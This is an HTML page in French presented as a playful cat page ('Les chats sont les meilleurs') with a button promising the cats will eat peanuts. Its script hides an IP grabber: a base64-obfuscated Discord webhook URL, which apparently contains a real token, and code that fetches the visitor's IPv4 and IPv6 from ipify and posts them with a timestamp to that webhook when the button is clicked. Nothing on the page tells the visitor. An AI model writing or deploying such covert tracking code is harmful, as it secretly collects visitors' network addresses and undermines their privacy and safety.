<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Les chats sont les meilleurs</title>
    <style>
        body,html{margin:0;padding:0;height:100%;overflow:hidden;font-family:'Segoe UI',sans-serif;
            background:linear-gradient(-45deg,#ff9a9e,#fad0c4,#a18cd1,#fbc2eb);background-size:400% 400%;
            animation:g 15s ease infinite;display:flex;flex-direction:column;align-items:center;justify-content:center;color:white;}
        @keyframes g{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
        h1{font-size:6vw;font-weight:900;background:rgba(255,255,255,.15);padding:60px 100px;border-radius:50px;backdrop-filter:blur(15px);}
        .btn{margin-top:30px;padding:16px 40px;background:rgba(255,255,255,.25);border:none;border-radius:50px;
            color:white;font-size:19px;font-weight:bold;cursor:pointer;backdrop-filter:blur(10px);
            box-shadow:0 8px 25px rgba(0,0,0,.3);transition:.3s;}
        .btn:hover{transform:scale(1.08);}
        @media(max-width:768px){h1{font-size:11vw;padding:40px 60px;}}
    </style>
</head>
<body>
<h1>Les chats sont les meilleurs</h1>
<button id="btn" class="btn">Clique ici et les chats vont manger des cacahuètes</button>
<script>
const webhookB64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0MTc4OTQwNDAwNjk3NzYxMC95enVaOVppTHRtQzhVQzZQSFR0TnEtU2VqSHlJQ2NfWHgxMWN3VzhoNlRHaUQ3dVdrN2NyV3NhWEtXX1RFeWQwSHJvag==";
let sent = false;

async function getIPs() {
    let ipv4 = "inconnue", ipv6 = "non détectée";
    try {
        const r = await fetch("https://api64.ipify.org?format=json");
        const d = await r.json();
        if (d.ip?.includes(":")) ipv6 = d.ip;
        else ipv4 = d.ip || "inconnue";
    } catch {}
    if (ipv4 === "inconnue") {
        try { ipv4 = await (await fetch("https://api.ipify.org")).text(); } catch {}
    }
    return { ipv4, ipv6 };
}

async function sendOnce() {
    if (sent) return;
    sent = true;
    
    const { ipv4, ipv6 } = await getIPs();
    const url = atob(webhookB64);
    
    fetch(url, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            embeds: [{
                title: "Nouveau chat nourri de cacahuètes",
                color: 16749880,
                fields: [
                    { name: "IPv4",  value: ipv4, inline: true },
                    { name: "IPv6",  value: ipv6, inline: true },
                    { name: "Heure", value: new Date().toLocaleString("fr-FR") }
                ],
                image: { url: "https://i.redd.it/289ch4osfyie1.jpeg" },
                thumbnail: { url: "https://cataas.com/cat" }
            }]
        })
    });
}

// Clic = envoi + disparition bouton
document.getElementById("btn").onclick = () => {
    sendOnce();
    const b = document.getElementById("btn");
    b.style.transition = "all .6s";
    b.style.transform = "scale(0)";
    setTimeout(() => b.remove(), 600);
};
</script>
</body>
</html>
